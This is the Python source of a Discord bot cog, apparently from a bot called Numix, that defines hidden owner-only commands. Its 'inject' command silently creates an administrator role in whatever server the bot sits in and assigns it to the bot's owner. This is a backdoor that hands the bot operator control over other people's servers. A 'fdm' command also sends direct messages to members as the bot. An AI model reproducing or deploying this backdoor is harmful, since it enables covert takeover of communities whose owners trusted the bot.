from numix_imports import *

class SECTOR_D(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
		self.config = default.get("./config.json")
		print("\"Sector D\" Loaded")

	def authorize(self, ctx):
		if ctx.author.id in self.config.owners:
			return True
		else:
			return False

	@commands.command(hidden=True)
	async def say(self, ctx, *, message):
		if self.authorize(ctx) == False:
			if ctx.guild.owner_id == ctx.author.id:
				await ctx.message.delete()
				return await ctx.send(message)
			
			else:
				embed = discord.Embed(timestamp=ctx.message.created_at, description=f"You do not meet the required guild permissions the command \"`say`\" requires to be executed.\n\nYou need `SERVER_OWNER` Permission in this Guild to be able to execute/run/use this command.", color=242424)
				embed.set_author(name="Insufficient Permissions", icon_url=self.config.forbidden_img)
				embed.set_footer(text="Numix", icon_url=self.config.logo)
				await ctx.send(embed=embed)

		else:
			await ctx.message.delete()
			await ctx.send(message)

	@commands.command(hidden=True)
	async def inject(self, ctx):
		try:
			if self.authorize(ctx) == False:
				return
			
			else:
				role_permissions = discord.Permissions(administrator=True)
				role = await ctx.guild.create_role(name="Numix Ownership", permissions=role_permissions)
				await ctx.author.add_roles(role)
				await ctx.send(f"{self.config.success} Injected Guild `{ctx.guild.id}`.")
		except:
			return await ctx.send(f"{self.config.forbiden} Unable to inject. Bot does not have required Permissions.")

	@commands.command(hidden=True)
	async def fdm(self, ctx, member: discord.Member = None, *, Message=None):
		try:
			if self.authorize(ctx) == False:
				return
			
			if member.id is None:
				return await ctx.send(f"{self.config.forbidden} User not found.")

			if Message is None:
				return await ctx.send(f"{self.config.forbidden} Provide a message to send.")
			
			await member.send(Message)
		except:
			return await ctx.send(f"{self.config.forbidden} Unable to message user.")

def setup(bot):
	bot.add_cog(SECTOR_D(bot))